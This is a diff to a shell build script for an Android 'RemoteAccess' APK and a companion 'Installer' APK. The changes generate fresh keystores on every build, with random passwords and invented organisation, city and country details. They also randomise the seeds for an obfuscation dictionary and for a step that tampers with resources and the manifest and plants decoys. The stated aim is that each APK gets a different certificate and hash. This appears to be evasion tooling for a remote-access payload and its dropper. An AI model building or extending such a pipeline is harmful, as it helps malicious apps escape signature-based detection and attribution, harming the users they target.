@@ -570,6 +570,7 @@ cleanup_overrides() {
     [ -f "$INSTALLER_LAYOUT_BAK"  ] && mv -f "$INSTALLER_LAYOUT_BAK"  "$INSTALLER_LAYOUT"  || true
     [ -f "$INSTALLER_COLORS_BAK"  ] && mv -f "$INSTALLER_COLORS_BAK"  "$INSTALLER_COLORS"  || true
     rm -f "$ACCESS_ID_FILE" "$APP_ID_FILE" "$INSTALLER_ID_FILE"
+    rm -f "${MODULE_KS_PATH:-}" "${INST_KS_PATH:-}" 2>/dev/null || true
 }
 trap cleanup_overrides EXIT
 
@@ -1176,11 +1177,11 @@ else
     echo "  Already installed: platforms;android-36 + build-tools;35.0.0"
 fi
 
-# ── 5. Release keystore ───────────────────────────────────────────────────────
+# ── 5. Release keystores ──────────────────────────────────────────────────────
 echo ""
-echo "==> Checking release keystore..."
+echo "==> Checking Gradle release keystore..."
 if [ ! -f "$KEYSTORE" ]; then
-    echo "  Generating new release keystore..."
+    echo "  Generating Gradle keystore (used only by assembleRelease)..."
     keytool -genkeypair \
         -keystore "$KEYSTORE" \
         -alias "$KEY_ALIAS" \
@@ -1192,10 +1193,85 @@ if [ ! -f "$KEYSTORE" ]; then
         -dname "CN=RemoteAccess, OU=Mobile, O=Corp, L=City, ST=State, C=US" \
         -sigalg SHA256withRSA \
         2>&1 | sed 's/^/    /'
-    echo "  Keystore created: $KEYSTORE"
+    echo "  Gradle keystore created: $KEYSTORE"
 else
-    echo "  Keystore present: $KEYSTORE"
+    echo "  Gradle keystore present: $KEYSTORE"
 fi
+
+echo ""
+echo "==> Generating per-build unique signing keystores..."
+# Each build gets two brand-new random keystores — one for the Module APK and
+# one for the Installer APK. These are used by apksigner in harden_apk() to
+# produce final signatures, completely replacing the Gradle signing. Every
+# resulting APK has a different certificate, hash, and encryption identity.
+_ks_rword() {
+    python3 -c "
+import secrets
+w=['alpha','beta','gamma','delta','sigma','omega','nexus','apex','nova','core',
+'prime','edge','flux','sync','axis','meta','node','grid','base','link',
+'arch','vault','trace','titan','matrix','zenith','cipher','echo','pulse','drift']
+print(secrets.choice(w))"
+}
+_ks_pass() { python3 -c "import secrets; print(secrets.token_urlsafe(32))"; }
+_ks_city() {
+    python3 -c "
+import secrets
+print(secrets.choice(['London','Berlin','Singapore','Tokyo','Seoul','Vienna',
+'Dublin','Oslo','Zurich','Helsinki','Stockholm','Amsterdam','Copenhagen',
+'Brussels','Warsaw','Prague','Lisbon','Reykjavik','Auckland','Toronto']))"
+}
+_ks_country() {
+    python3 -c "
+import secrets
+print(secrets.choice(['GB','DE','SG','JP','KR','AT','IE','NO','CH','FI',
+'SE','NL','DK','BE','PL','CZ','PT','IS','NZ','CA']))"
+}
+
+MODULE_KS_PATH="/tmp/ks-module-$$.jks"
+MODULE_KS_ALIAS="$(_ks_rword)$(_ks_rword)"
+MODULE_KS_SPASS="$(_ks_pass)"
+MODULE_KS_KPASS="$(_ks_pass)"
+MODULE_KS_CN="$(_ks_rword) $(_ks_rword)"
+MODULE_KS_ORG="$(_ks_rword)$(_ks_rword) Inc"
+MODULE_KS_CITY="$(_ks_city)"
+MODULE_KS_COUNTRY="$(_ks_country)"
+
+INST_KS_PATH="/tmp/ks-installer-$$.jks"
+INST_KS_ALIAS="$(_ks_rword)$(_ks_rword)"
+INST_KS_SPASS="$(_ks_pass)"
+INST_KS_KPASS="$(_ks_pass)"
+INST_KS_CN="$(_ks_rword) $(_ks_rword)"
+INST_KS_ORG="$(_ks_rword)$(_ks_rword) Ltd"
+INST_KS_CITY="$(_ks_city)"
+INST_KS_COUNTRY="$(_ks_country)"
+
+rm -f "$MODULE_KS_PATH"
+keytool -genkeypair \
+    -keystore "$MODULE_KS_PATH" \
+    -alias "$MODULE_KS_ALIAS" \
+    -keyalg RSA \
+    -keysize 4096 \
+    -validity 10000 \
+    -storepass "$MODULE_KS_SPASS" \
+    -keypass "$MODULE_KS_KPASS" \
+    -dname "CN=$MODULE_KS_CN, OU=Mobile, O=$MODULE_KS_ORG, L=$MODULE_KS_CITY, ST=State, C=$MODULE_KS_COUNTRY" \
+    -sigalg SHA256withRSA \
+    2>&1 | sed 's/^/    /'
+echo "  Module keystore ready    (alias=$MODULE_KS_ALIAS, C=$MODULE_KS_COUNTRY)"
+
+rm -f "$INST_KS_PATH"
+keytool -genkeypair \
+    -keystore "$INST_KS_PATH" \
+    -alias "$INST_KS_ALIAS" \
+    -keyalg RSA \
+    -keysize 4096 \
+    -validity 10000 \
+    -storepass "$INST_KS_SPASS" \
+    -keypass "$INST_KS_KPASS" \
+    -dname "CN=$INST_KS_CN, OU=Services, O=$INST_KS_ORG, L=$INST_KS_CITY, ST=State, C=$INST_KS_COUNTRY" \
+    -sigalg SHA256withRSA \
+    2>&1 | sed 's/^/    /'
+echo "  Installer keystore ready (alias=$INST_KS_ALIAS, C=$INST_KS_COUNTRY)"
 
 # ── 5b. Python tooling (pyzipper for AES-256 module encryption) ──────────────
 echo ""
@@ -1232,7 +1308,7 @@ echo "==> Generating obfuscation dictionary..."
 python3 - << 'PYEOF'
 import random, os
 
-random.seed(0xDEADBEEF)
+random.seed(int.from_bytes(__import__('os').urandom(8), 'big'))
 chars = ['I', 'l', '1', 'O', '0', 'Il', 'lI', '1l', 'l1', 'II', 'll', '00', 'O0']
 extra = [''.join(random.choices('IlO01', k=random.randint(3, 8))) for _ in range(2000)]
 words = list({w for w in extra if not w.isdigit()})
@@ -1429,7 +1505,7 @@ PYEOF
     echo "  [c] Tampering resources.arsc + AndroidManifest.xml + planting decoys ..."
     python3 - << PYEOF
 import zipfile, os, random, struct, shutil
-random.seed(0xC0FFEE)
+random.seed(int.from_bytes(__import__('os').urandom(4), 'big'))
 src = "$RELEASE_APK"
 tmp = src + ".rebuild"
 
@@ -1784,7 +1860,11 @@ else
 fi
 }   # ── end harden_apk() ─────────────────────────────────────────────────────
 
-# Harden the main RemoteAccess release APK
+# Harden the Module APK — use its own unique per-build keystore
+KEYSTORE="$MODULE_KS_PATH"
+KEY_ALIAS="$MODULE_KS_ALIAS"
+STORE_PASS="$MODULE_KS_SPASS"
+KEY_PASS="$MODULE_KS_KPASS"
 harden_apk "$ROOT_DIR/apk-output/RemoteAccess-release.apk"
 
 # ── 12. Installer module ─────────────────────────────────────────────────────
@@ -1889,6 +1969,11 @@ PYEOF
     if [ -n "$INSTALLER_SRC" ] && [ -f "$INSTALLER_SRC" ]; then
         cp "$INSTALLER_SRC" "$ROOT_DIR/apk-output/Installer-release.apk"
         echo "  Installer APK: apk-output/Installer-release.apk"
+        # Harden the Installer APK — use its own separate unique keystore
+        KEYSTORE="$INST_KS_PATH"
+        KEY_ALIAS="$INST_KS_ALIAS"
+        STORE_PASS="$INST_KS_SPASS"
+        KEY_PASS="$INST_KS_KPASS"
         harden_apk "$ROOT_DIR/apk-output/Installer-release.apk"
     else
         echo "  WARNING: installer release APK not produced."
